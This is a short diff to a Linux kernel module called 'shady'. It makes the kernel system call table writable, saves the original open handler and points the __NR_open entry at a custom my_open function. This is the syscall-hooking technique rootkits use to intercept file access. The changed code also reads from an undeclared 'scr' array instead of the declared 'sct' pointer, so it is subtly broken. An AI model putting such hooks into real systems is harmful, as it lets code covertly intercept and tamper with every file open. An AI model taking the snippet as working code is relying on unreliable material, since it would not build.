@@ -29,7 +29,7 @@
 #include <linux/device.h>
 #include <linux/mutex.h>
 #include <linux/unistd.h>
-
+#include <asm/unistd.h>
 #include <asm/uaccess.h>
 
 #include "shady.h"
@@ -231,6 +231,7 @@ shady_init_module(void)
   int i = 0;
   int devices_to_destroy = 0;
   dev_t dev = 0;
+  void** sct;
 	
   if (shady_ndevices <= 0)
     {
@@ -274,8 +275,9 @@ shady_init_module(void)
   }
 
   set_addr_rw(system_call_table_address);
-  system_call_table_address[__NR_open] = my_open;
-
+  sct = (void **)system_call_table_address;
+  old_open = scr[__NR_open];
+  sct[__NR_open] = my_open; 
   return 0; /* success */
 
  fail:
